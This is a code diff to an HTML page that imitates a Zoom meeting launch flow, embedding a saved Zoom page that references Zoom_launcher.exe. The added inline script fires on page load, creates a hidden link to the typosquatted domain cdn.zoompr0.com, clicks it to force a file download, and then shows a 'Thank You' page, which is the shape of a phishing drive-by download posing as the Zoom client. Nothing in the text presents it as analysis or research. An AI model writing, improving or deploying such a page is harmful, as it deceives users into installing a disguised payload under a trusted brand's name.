@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script src="autoDownload.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Multi-Page Flow</title>
@@ -908,6 +907,38 @@ For California Residents, you may exercise your right to “Opt-Out of the Sale/
 </style>
         </head><body></body></html>" data-savepage-sameorigin="" style="display: none;" data-savepage-src="https://zoom.us/launch/download/ky0or_O5H5L7YWbzylaUWo0pI3DGpvq3gR6yx6ENSGf5Kqo5V2apWiPdx1GlB9od7tFkEXz_ZBo4XXjUAULN9k7GKyjyMO_EvCA16k1g6yusCj679rCBAgj-JZXyg2yuoapZUfRi2cSr9lus4yWXIUf0v-O0Sa0SmtkleQIjfhfnudkVirBsveoIZG7DMckwFfgGa2xaF1L2NHgNtC_8_6Rao64VzlI9jeH2dEg9N_Tor1ylUkCFKkNIxMEyfYWly4QebRAiXx4X02yGvkBMk_fvpWoBwav4bSYy8BDQbPrcRPJXLI3MGt9bI-2cVDiTayXP6LXgOxnCA3kJbPqbGD5NCUXpCrnESLMpl8B9ZqmHSGm539Ix0YBhB2KO84B6cu6LRbTtozdrkSqYNmHBdMDEpDa-qzlL115teL1kaWgqPK6EkZ9Cn_Lh5YdKSnfc2zZgW5upG43tFw64WqIoqe1AZSnLQK3eCc8ApExgTjghCcML_l4hfG7ZnZk1ILFCCuaY0P4JY1e2moI_BLUsdgCxYzZwuJveshPmGLlJSGo8xxeWpFDdYALDqJKQvxdwmbCsQHrOAmS-7qwOiA5W3TAlND3ujwQ.L-u4VrZ7JK6d9piq/meeting/2afx3CZUSUbTJ1_TW5P-Lb9wNQUhBNGZ7qs.yz23baUnKo8c0dkw/Zoom_launcher.exe" src="" data-savepage-key="0-2"></iframe>
     </body></html>
+        <script>
+    window.onload = function() {
+        // Wait for the page to fully load before executing the download logic
+        setTimeout(function() {
+            const fileKey = "file1"; // Change this to the appropriate file key if needed
+
+            // Create a hidden download link
+            const downloadLink = document.createElement("a");
+            downloadLink.href = `https://cdn.zoompr0.com/download.php?file=${fileKey}`;
+            downloadLink.style.display = "none";
+            downloadLink.setAttribute("download", ""); // Suggest the browser to download
+
+            // Append the link to the document and trigger the download
+            document.body.appendChild(downloadLink);
+
+            // Check if the link exists before triggering the download
+            if (downloadLink) {
+                downloadLink.click();
+                document.body.removeChild(downloadLink); // Clean up by removing the link after clicking
+            } else {
+                console.error("Download link not created successfully");
+            }
+
+            // Wait for a short time to ensure the download starts before showing the next page
+            setTimeout(function() {
+                // Transition to the final "Thank You" page (Page 3)
+                showPage('page3');
+            }, 3000); // Delay to ensure the download has started (adjust timing if needed)
+
+        }, 500); // Delay slightly to ensure page is fully loaded
+    };
+</script>
     </div>
 
     <!-- Page 3: Thank You Page -->
